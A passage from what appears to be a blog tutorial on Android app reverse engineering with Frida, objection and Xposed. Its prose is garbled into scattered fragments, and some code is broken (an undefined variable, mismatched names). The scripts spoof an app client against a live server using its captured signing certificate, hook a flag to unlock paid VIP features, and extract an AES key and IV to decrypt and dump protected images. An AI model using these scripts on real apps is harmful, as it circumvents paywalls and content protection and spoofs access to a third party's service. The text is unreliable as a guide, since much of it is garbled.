class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># invoke.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tv</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.root = <span class="string">&quot;http://39.108.64.125/WebRoot/superMaster/Server&quot;</span></span><br><span class="line">        self.memi1 = <span class="string">&quot;34463b7d13ee6ad9&quot;</span></span><br><span class="line">        self.rightkey = <span class="string">&quot;376035775&quot;</span></span><br><span class="line">        self.key = <span class="string">&quot;308202d5308201bda00302010202041669d9bf300d06092a864886f70d01010b0500301b310b3009060355040613023836310c300a06035504031303776569301e170d3136303731383038313935395a170d3431303731323038313935395a301b310b3009060355040613023836310c300a0603550403130377656930820122300d06092a864886f70d01010105000382010f003082010a028201010095f85892400aae03ca4ed9dcd838d162290ae8dd51939aac6ecfde8282f207c4cd9e507929a279e0a36f1e4847330cb53908c92915b2c6a93d7064be452d073a472093f7ca14f4ab68f827582fe0988e9e4bc8a6ea3b56001cbbbb760f9eec571b0bbc97392e65aaf08c686f0e2ba353896d48a37c36716239977bd0e4dd878025cab497d8164537aec9f6599eefb98577dce972a1b794e211226520e23497beec3fd8548bb5b4d263120d40115cca28116bac32378df5033f536a0d7367fef78c587fefed28c5c9b35ba684ed6e46d9369c40950cf7ad7236d10b7a51dfd2a8f218db72323bbd19f46947410b1191f263012ad4ba8f749223e37591254ee7f50203010001a321301f301d0603551d0e041604143d43284bd5e4b0d322c9962a5b70aad4dcbc3634300d06092a864886f70d01010b050003820101000f04c51ff763311aa011777ba2842b441b15c316373d1e1ed4116cf86e29d55c6ed3fa4c475251b1fb4fac57195dbca0166ebe565d9834552a3758b97c4528bab1f7ab82bb3a9faa932f5bc10943f3daf52e0fe5889ffb58a6be67ea1c9a2fb37dc8aa6f3af476039a467336991a4e52dccd520195cd473eb5b984e702ed9ff638a14c3abb575a7a80ae4062084d1138a06a20e173be9df32df631311b07352898706198ddebaaa011f0da8e5f288f7cfb77505bc943f6476d6cc1feef56b68137aad91f23c4bb772169539d05653a6f0d75f7192164e822b934322f3a975df677903b1667f5dc1e9ddb185da3281d31bfb8f67a84bd23bbcb398f8bb637dd72&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, data=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            data = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> requests.post(url = self.root, data = data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self, name, pw</span>):</span><br><span class="line">        ret = self.post(&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:name, </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:pw,</span><br><span class="line">            <span class="string">&quot;memi1&quot;</span>:self.memi1,</span><br><span class="line">            <span class="string">&quot;key&quot;</span>:self.key,</span><br><span class="line">            <span class="string">&quot;rightkey&quot;</span>:self.rightkey,</span><br><span class="line">            <span class="string">&quot;register&quot;</span>:<span class="string">&quot;register&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;register: &quot;</span>, ret.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self, name, pw</span>):</span><br><span class="line">        ret = self.post(&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:name, </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:pw,</span><br><span class="line">            <span class="string">&quot;memi1&quot;</span>:self.memi1,</span><br><span class="line">            <span class="string">&quot;key&quot;</span>:self.key,</span><br><span class="line">            <span class="string">&quot;rightkey&quot;</span>:self.rightkey,</span><br><span class="line">            <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span></span><br><span class="line">        &#125;)       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login: &quot;</span>, ret.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tv = tv()</span><br><span class="line">    <span class="comment"># register</span></span><br><span class="line">    <span class="built_in">print</span>(tv.register(<span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;1111&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login</span></span><br><span class="line">    <span class="built_in">print</span>(tv.login(<span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;1111&quot;</span>))</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231010155627948.png" alt="image-20231010155627948" style="zoom:67%;" /></p><h3 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h3><p>&emsp;fulao2.apk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install fulao2.apk</span><br></pre></td></tr></table></figure><h4 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h4><p>&emsp;app</p><p><img src="/images/frida-reverse-analysis-2/image-20231010163343163.png" alt="image-20231010163343163" style="zoom:67%;" /></p><p>&emsp;okviphookEvent.jshookEvent.js</p><p><img src="/images/frida-reverse-analysis-2/image-20231010164845820.png" alt="image-20231010164845820" style="zoom:67%;" /></p><p>&emsp;<code>com.ilulutv.fulao2.film.l$t</code></p><p>&emsp;apkPKIDmovetv.apk</p><p><img src="/images/frida-reverse-analysis-2/image-20231010165814405.png" alt="image-20231010165814405" style="zoom:67%;" /></p><p>&emsp;<code>com.ilulutv.fulao2.film.l$t</code></p><p><img src="/images/frida-reverse-analysis-2/image-20231010170758627.png" alt="image-20231010170758627" style="zoom:67%;" /></p><p>&emsp;</p><p>1<code>this.d.i</code>vip</p><p><img src="/images/frida-reverse-analysis-2/image-20231010172852843.png" alt="image-20231010172852843" style="zoom:67%;" /></p><p>2</p><p>&emsp;<code>l.d(this.d)</code>trueappfrida<code>l.d(this.d)</code><code>l.d</code>arg0l</p><p><img src="/images/frida-reverse-analysis-2/image-20231010173538290.png" alt="image-20231010173538290" style="zoom:67%;" /></p><p>&emsp;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookq0.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookq0</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ilulutv.fulao2.film.l&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance =&gt;&quot;</span>, instance)</span><br><span class="line">                instance.<span class="property">q0</span>.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;completed&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;app<code></code></p><p>&emsp;<code>charles|postern</code>hook<code>1app2appSSL Pinning</code>appfridabypass<code>3hook</code></p><p>&emsp;hookhook1androidokhttp3retrofithook2httphookr0ysuer0capture<code>hooksocket</code></p><p>&emsp;<a href="https://github.com/r0ysue/r0capture">r0capture</a>r0capture<code></code></p><p>&emsp;androidBitmapFactorybitmapImageViewBitmap</p><p>&emsp;objectionwallbreakerBitmapBitmapappBitmap</p><p>&emsp;androidBitmapFactory4<code>decodeFiledecodeResourcedecodeStreamdecodeByteArray</code><code></code>BitmapBitmapFactoryhook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class android.graphics.BitmapFactory </span><br></pre></td></tr></table></figure><p>&emsp;<code>decodeByteArray</code>static1fridasaveBitmap.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate random string as image name</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">guid</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/[xy]/g</span>, <span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="comment">// generate r in [0:1:15]</span></span><br><span class="line">        <span class="keyword">var</span> r = <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">16</span> | <span class="number">0</span></span><br><span class="line">        <span class="keyword">var</span> v = c == <span class="string">&quot;x&quot;</span> ? r : (r&amp;<span class="number">0x3</span>|<span class="number">0x8</span>)</span><br><span class="line">        <span class="keyword">return</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook decodeByteArray</span></span><br><span class="line"><span class="comment">// decodeByteArray(byte[] data, int offset, int length, Options opts)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveBitmap_1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BitmapFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.BitmapFactory&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> decodeByteArray_func = decodeByteArray.<span class="title function_">overload</span>(<span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;android.graphics.BitmapFactory$Options&quot;</span>)</span><br><span class="line">        decodeByteArray_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">data, offset, length, opts</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeByteArray</span>(data, offset, length, opts)</span><br><span class="line">            <span class="keyword">var</span> path = <span class="string">&quot;/sdcard/Download/tmp&quot;</span> + <span class="title function_">guid</span>() + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;path =&gt;&quot;</span>, path)</span><br><span class="line">            <span class="keyword">var</span> f = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(path)</span><br><span class="line">            <span class="keyword">var</span> fos = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(f)</span><br><span class="line">            fos.<span class="title function_">write</span>(data)</span><br><span class="line">            fos.<span class="title function_">close</span>()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(saveBitmap_1)</span><br></pre></td></tr></table></figure><p>&emsp;saveBitmap_1rpc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookBitmap.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saveBitmap_1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BitmapFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.BitmapFactory&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> decodeByteArray_func = <span class="title class_">BitmapFactory</span>.<span class="property">decodeByteArray</span>.<span class="title function_">overload</span>(<span class="string">&quot;[B&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;android.graphics.BitmapFactory$Options&quot;</span>)</span><br><span class="line">        decodeByteArray_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">data, offset, length, opts</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeByteArray</span>(data, offset, length, opts)</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            var path = &quot;/sdcard/Download/tmp&quot; + guid() + &quot;.jpg&quot;</span></span><br><span class="line"><span class="comment">            console.log(&quot;path =&gt;&quot;, path)</span></span><br><span class="line"><span class="comment">            var f = Java.use(&quot;java.io.File&quot;).$new(path)</span></span><br><span class="line"><span class="comment">            var fos = Java.use(&quot;java.io.FileOutputStream&quot;).$new(f)</span></span><br><span class="line"><span class="comment">            fos.write(data)</span></span><br><span class="line"><span class="comment">            fos.close()</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="title function_">send</span>(data)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(saveBitmap_1)</span><br></pre></td></tr></table></figure><p>&emsp;python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># saveBitmap.py</span></span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        image = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        </span><br><span class="line">        intArr = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> image:</span><br><span class="line">            ival = <span class="built_in">int</span>(m)</span><br><span class="line">            <span class="keyword">if</span> ival &lt; <span class="number">0</span>:</span><br><span class="line">                ival += <span class="number">256</span></span><br><span class="line">            intArr.append(ival)</span><br><span class="line">        bs = <span class="built_in">bytes</span>(intArr)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  uuid </span></span><br><span class="line">        fileName = <span class="built_in">str</span>(uuid.uuid1()) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fileName:&quot;</span>, fileName)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        f.write(bs)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">target = device.get_frontmost_application()</span><br><span class="line">session = device.attach(target.pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hookBitmap.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><p>&emsp;saveBitmap.py<code></code></p><p>&emsp;objection hook decodeByteArray</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.graphics.BitmapFactory.decodeByteArray &quot;[B, int, int, android.graphics.BitmapFactory$Options&quot; --dump-backtrace </span><br></pre></td></tr></table></figure><p>&emsp;<code>com.ilulutv.fulao2.other.helper.glide.b.a</code>jeb</p><p><img src="/images/frida-reverse-analysis-2/image-20231010201958270.png" alt="image-20231010201958270" style="zoom:67%;" /></p><p>&emsp;arg3Keyarg4IVarg5</p><p><img src="/images/frida-reverse-analysis-2/image-20231010202233421.png" alt="image-20231010202233421" style="zoom:67%;" /></p><p>&emsp;keyIV</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getKey.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getKey</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CipherClient</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.idik.lib.cipher.so.CipherClient&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> key = <span class="title class_">CipherClient</span>.<span class="title function_">decodeImgKey</span>()</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="title class_">CipherClient</span>.<span class="title function_">decodeImgIv</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key, iv)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;keyIVrpc<code>com.ilulutv.fulao2.other.i.b.a</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// final.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_image_ciphertext</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ilulutv.fulao2.other.i.b&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> a_func = b.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>)</span><br><span class="line">        a_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">a</span>(obj)</span><br><span class="line">            <span class="title function_">send</span>(result)</span><br><span class="line">            <span class="keyword">return</span> result            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># final.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IMGdecrypt</span>(<span class="params"><span class="built_in">bytearray</span></span>):</span><br><span class="line">    key = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;xxxx&quot;</span>    </span><br><span class="line">    imgkey = base64.decodebytes(<span class="built_in">bytes</span>(key), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    imgiv = base64.decodebytes(<span class="built_in">bytes</span>(iv), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(imgkey, AES.MODE_CBC, imgiv)</span><br><span class="line">    msg = cipher.decrypt(<span class="built_in">bytearray</span>)</span><br><span class="line">    <span class="keyword">return</span> msg                      </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        image = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        intArr = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> image:</span><br><span class="line">            ival = <span class="built_in">int</span>(m)</span><br><span class="line">            <span class="keyword">if</span> ival &lt; <span class="number">0</span>:</span><br><span class="line">                ival += <span class="number">256</span></span><br><span class="line">            intArr.append(ival)</span><br><span class="line">        bs = <span class="built_in">bytes</span>(intArr)</span><br><span class="line">        bs = IMGdecrypt(bs)</span><br><span class="line">        <span class="comment">#  uuid </span></span><br><span class="line">        fileName = <span class="built_in">str</span>(uuid.uuid1()) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fileName:&quot;</span>, fileName)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        f.write(bs)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment">#                                   </span></span><br><span class="line">target = device.get_frontmost_application()</span><br><span class="line">session = device.attach(target.pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;final.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="0x04-Xposed-HookRPC"><a href="#0x04-Xposed-HookRPC" class="headerlink" title="0x04 Xposed HookRPC"></a>0x04 Xposed HookRPC</h2><p>&emsp;Xposed  Frida <code> hook </code>EdXposed  Xposed  Xposed  frida </p><h3 id="Xposed--hook"><a href="#Xposed--hook" class="headerlink" title="Xposed  hook"></a>Xposed  hook</h3><h4 id="Xposed--amp-Xposed"><a href="#Xposed--amp-Xposed" class="headerlink" title="Xposed &amp;Xposed"></a>Xposed &amp;Xposed</h4><p>&emsp; Root  XposedInstaller App  xposed  hook  hookxposed  zygote libart.so  XposedBridge.jar  hook xposed 7.1 root</p><p>&emsp; Xposed </p><p>&emsp;XposedAppxposedappxposed</p><p>1AndroidManifest.xmlapplicationmeta-data</p><p><img src="/images/frida-reverse-analysis-2/image-20231019184544598.png" alt="image-20231019184544598" style="zoom:67%;" /></p><p>2appassetsxposed_initXposed<code>com.roysue.xposed1.HookTest</code></p><p>3MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.xposed1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AppCompatActivity  Android </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">//  activity_main.xml </span></span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">//  button</span></span><br><span class="line">        button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// </span></span><br><span class="line">                